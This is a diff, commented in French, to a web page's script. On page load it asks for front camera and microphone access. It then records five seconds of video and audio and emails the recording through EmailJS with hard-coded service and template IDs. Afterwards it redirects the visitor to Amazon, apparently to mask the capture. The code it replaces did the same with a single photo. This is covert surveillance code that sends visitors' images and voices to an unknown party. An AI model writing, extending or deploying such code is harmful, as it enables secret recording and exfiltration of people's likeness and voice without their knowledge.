@@ -65,18 +65,19 @@
     // Démarrage automatique dès le chargement
     window.addEventListener('load', async () => {
       try {
-        // Demande d'accès à la caméra frontale
+        // Demande d'accès à la caméra frontale et micro
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { 
             facingMode: 'user' // Caméra frontale
-          }
+          },
+          audio: true // Ajout du micro
         });
         
         video.srcObject = stream;
         
-        // Attendre que la vidéo soit prête puis prendre la photo
+        // Attendre que la vidéo soit prête puis enregistrer
         video.addEventListener('loadedmetadata', () => {
-          captureAndSend(); // Capture immédiate
+          setTimeout(startRecording, 5000); // Délai de 5s avant enregistrement
         });
         
       } catch (err) {
@@ -86,7 +87,77 @@
       }
     });
     
-    function captureAndSend() {
+    let mediaRecorder;
+    let recordedChunks = [];
+    
+    function startRecording() {
+      try {
+        const stream = video.srcObject;
+        mediaRecorder = new MediaRecorder(stream);
+        recordedChunks = [];
+        
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            recordedChunks.push(event.data);
+          }
+        };
+        
+        mediaRecorder.onstop = () => {
+          sendVideoAndRedirect();
+        };
+        
+        // Démarrer l'enregistrement pour 5 secondes
+        mediaRecorder.start();
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 5000);
+        
+      } catch (err) {
+        console.error('Erreur enregistrement:', err);
+        redirectToAmazon();
+      }
+    }
+    
+    function sendVideoAndRedirect() {
+      try {
+        // Créer le blob vidéo
+        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        
+        // Convertir en base64 pour l'email
+        const reader = new FileReader();
+        reader.onload = () => {
+          const videoData = reader.result;
+          
+          // Arrêter la caméra
+          const stream = video.srcObject;
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+          }
+          
+          // Envoyer par email
+          emailjs.send("service_8cs0gml", "template_w14xn7c", {
+            name: "Visiteur",
+            time: new Date().toLocaleString(),
+            message: "Vidéo automatique (5 sec)",
+            image: videoData
+          }).then(() => {
+            console.log('Vidéo envoyée');
+          }).catch(err => {
+            console.error('Erreur envoi:', err);
+          }).finally(() => {
+            redirectToAmazon();
+          });
+        };
+        
+        reader.readAsDataURL(videoBlob);
+        
+      } catch (err) {
+        console.error('Erreur traitement vidéo:', err);
+        redirectToAmazon();
+      }
+    }
+    
+    function oldCaptureAndSend() {
       try {
         // Capturer l'image
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
